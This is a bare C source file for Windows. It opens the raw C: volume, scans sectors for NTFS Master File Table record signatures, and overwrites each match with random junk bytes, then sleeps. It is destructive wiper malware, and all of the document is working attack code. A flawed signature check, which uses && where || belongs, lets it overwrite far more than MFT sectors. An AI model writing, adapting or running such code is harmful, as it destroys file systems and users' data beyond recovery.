#include <Windows.h>
#include <stdio.h>

BOOL
ReadMFT(
	INT iSector
)
{
	DWORD dwRead;
	BYTE bData[ 512 ];
	HANDLE hDrive;


	hDrive = CreateFileA( "\\\\.\\C:", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
						  NULL, OPEN_EXISTING, NULL, NULL );

	if ( hDrive == INVALID_HANDLE_VALUE )
		return FALSE;


	SetFilePointer( hDrive, iSector * 512, NULL, FILE_CURRENT ); // Point to iSector value
	if ( !ReadFile( hDrive, bData, 512, &dwRead, NULL ) ) // Read 512 bytes from the current point
	{
		CloseHandle( hDrive );
		//printf( "ReadFile:\n%d\n", GetLastError() );
		return FALSE;
	}
	CloseHandle( hDrive ); // The handle can be closed atm.

	if ( bData[ 0 ] != 0x46 && bData[ 1 ] != 0x49 && bData[ 2 ] != 0x4C &&
		 bData[ 3 ] != 0x45 && bData[ 3 ] != 0x30 ) // 46 49 4C 45 30 -> FILE0
	{
		//printf( "bData ( FILE0 ):\nFALSE" );
		return FALSE;
	}

	return TRUE;
}

BYTE arrayList[ 5 ] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x69 };

VOID
WriteSector(
	INT iSector
)
{
	BYTE bData[ 512 ];
	for ( INT sector = 0; sector < 512; ++sector )
		bData[ sector ] = arrayList[ rand( ) % 5 ]; //Writting random garbish

	DWORD dwRead;
	HANDLE hDrive;

	hDrive = CreateFileA( "\\\\.\\C:", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
						  NULL, OPEN_EXISTING, NULL, NULL );

	if ( hDrive == INVALID_HANDLE_VALUE )
		return;

	SetFilePointer( hDrive, iSector * 512, NULL, FILE_CURRENT ); // Point to iSector value
	if ( !WriteFile( hDrive, bData, 512, &dwRead, NULL ) ) // Write 512 bytes from the current point
	{
		CloseHandle( hDrive );
		printf( "WriteFile:\n%d\n", GetLastError( ) );
		return;
	}

	CloseHandle( hDrive ); // The handle can be closed atm.
}

INT
main( 

)
{
	for ( INT iSector = 500000; iSector < 20000000;)
	{
		iSector += 2;
		if ( ReadMFT( iSector ) )
		{
			printf( "Found MFT Sector at %d\n", iSector );
			WriteSector( iSector );
		}

	}

	Sleep( 0xFFFFFF );
	return 0;
}